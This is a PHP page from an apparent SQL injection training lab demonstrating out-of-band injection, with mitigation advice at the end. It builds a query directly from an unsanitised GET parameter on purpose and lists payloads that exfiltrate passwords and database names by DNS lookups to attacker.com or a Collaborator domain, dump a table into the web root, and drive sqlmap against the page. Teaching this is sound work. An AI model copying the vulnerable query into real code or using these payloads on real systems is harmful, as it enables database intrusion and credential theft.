<?php
/**
 * DEMO: Out-of-Band (OOB) SQL Injection
 *
 * Attack concept: Instead of reading data in the HTTP response (in-band),
 * the attacker triggers the database to make an outbound connection
 * (DNS lookup or HTTP request) carrying extracted data.
 *
 * Requires: MySQL FILE privilege + outbound network access from DB server.
 * This page simulates the payloads and shows what would happen.
 */
if ( ! defined('SQL_INJECTION_IN_PHP') ) die('Direct access not permitted');
?>

<div class="card mb-4 border-warning">
  <div class="card-header bg-warning text-dark">
    <strong>⚠️ Out-of-Band (OOB) SQL Injection Demo</strong>
  </div>
  <div class="card-body">
    <p class="mb-1"><strong>Concept:</strong> Data is exfiltrated via DNS/HTTP from the DB server — the HTTP response is always identical. No output, no error, no timing difference.</p>
    <p class="mb-1"><strong>Requires:</strong> MySQL <code>FILE</code> privilege + <code>secure_file_priv</code> allowing outbound access.</p>
    <p class="mb-0 text-muted small">In this lab the DB container doesn't have outbound DNS, so we simulate the payload and show what the attacker would receive.</p>
  </div>
</div>

<form method="get" class="mb-3">
  <input type="hidden" name="action" value="oob"/>
  <div class="input-group" style="max-width:500px">
    <span class="input-group-text">User ID</span>
    <input type="text" name="uid" class="form-control"
           placeholder="Try the OOB payloads below"
           value="<?= htmlspecialchars($_GET['uid'] ?? '') ?>">
    <button class="btn btn-outline-secondary" type="submit">Execute</button>
  </div>
</form>

<?php
$uid = $_GET['uid'] ?? '';

if ($uid !== '') {
    $sql = "SELECT id FROM user WHERE id = {$uid}";
    echo '<div class="alert alert-secondary"><strong>Injected SQL:</strong><br><code>' . htmlspecialchars($sql) . '</code></div>';

    try {
        $pdo->setAttribute(\PDO::ATTR_ERRMODE, \PDO::ERRMODE_SILENT);
        $result = $pdo->query($sql);
        echo '<div class="alert alert-info">Query executed. HTTP response is identical — attacker sees nothing here. Data left via DNS/HTTP.</div>';
    } catch (\Exception $e) {
        echo '<div class="alert alert-info">Query attempted. (OOB data would be in DNS logs, not here.)</div>';
    }
}
?>

<div class="card mb-4">
  <div class="card-header bg-dark text-white"><strong>OOB Attack Payloads (MySQL)</strong></div>
  <div class="card-body">
    <h6 class="fw-bold">1. DNS Exfiltration via LOAD_FILE (Windows MySQL)</h6>
    <pre class="bg-light p-2 rounded small">1 AND LOAD_FILE(concat('\\\\', (SELECT password FROM user LIMIT 1), '.attacker.com\\share'))</pre>
    <p class="small text-muted mb-3">The MySQL server resolves <code>[password].attacker.com</code> as a UNC path. The DNS lookup for that subdomain is recorded by the attacker's DNS server — containing the password.</p>

    <h6 class="fw-bold">2. Database name via DNS</h6>
    <pre class="bg-light p-2 rounded small">1 AND LOAD_FILE(concat('\\\\', (SELECT database()), '.attacker.com\\x'))</pre>
    <p class="small text-muted mb-3">DNS query to <code>sql_demo.attacker.com</code> reveals the database name.</p>

    <h6 class="fw-bold">3. HTTP exfiltration via SELECT INTO OUTFILE (if FILE privilege granted)</h6>
    <pre class="bg-light p-2 rounded small">1 AND (SELECT * FROM user INTO OUTFILE '/var/www/html/leaked.txt')</pre>
    <p class="small text-muted mb-3">If MySQL has write access to the web root, the table is written to a readable URL: <code>http://localhost:8080/leaked.txt</code></p>

    <h6 class="fw-bold">4. Burp Collaborator / interactsh — receive OOB data</h6>
    <pre class="bg-light p-2 rounded small"># Generate a collaborator URL: xxxxx.burpcollaborator.net
1 AND LOAD_FILE(concat('\\\\', (SELECT hex(password) FROM user LIMIT 1), '.xxxxx.burpcollaborator.net\\x'))
# The hex-encoded password appears as a DNS subdomain in Collaborator logs</pre>

    <h6 class="fw-bold">5. sqlmap OOB technique</h6>
    <pre class="bg-light p-2 rounded small">sqlmap -u "http://localhost:8080/profile.php?action=oob&uid=1" \
  --technique=F --dns-domain=attacker.com --dump --batch</pre>
  </div>
</div>

<div class="card mb-4 border-info">
  <div class="card-header bg-info text-white"><strong>How to Set Up OOB Detection</strong></div>
  <div class="card-body">
    <ol class="mb-0 small">
      <li class="mb-2"><strong>Burp Suite Pro → Burp Collaborator:</strong> Generates unique URLs. Any DNS/HTTP/SMTP interaction is logged with the payload data.</li>
      <li class="mb-2"><strong>interactsh (free):</strong>
        <pre class="bg-light p-1 rounded">interactsh-client  # generates unique.oastify.com domain
# Use it in LOAD_FILE payloads to capture DNS queries</pre>
      </li>
      <li class="mb-2"><strong>Your own DNS server:</strong> Run <code>tcpdump -i eth0 port 53</code> on a server with a wildcard DNS record and monitor incoming queries.</li>
    </ol>
  </div>
</div>

<div class="card border-success">
  <div class="card-header bg-success text-white"><strong>Fix + Prevention</strong></div>
  <div class="card-body">
    <ul class="mb-0">
      <li><strong>Parameterized queries</strong> — eliminates the injection point entirely.</li>
      <li><strong>Revoke FILE privilege:</strong> <code>REVOKE FILE ON *.* FROM 'appuser'@'%';</code></li>
      <li><strong>Set <code>secure_file_priv</code></strong> to an empty path in <code>my.cnf</code> to disable <code>LOAD_FILE</code> and <code>INTO OUTFILE</code>.</li>
      <li><strong>Network egress filtering</strong> — the DB server should have no outbound internet access (no DNS, no HTTP). This stops OOB exfiltration even if injection exists.</li>
    </ul>
  </div>
</div>
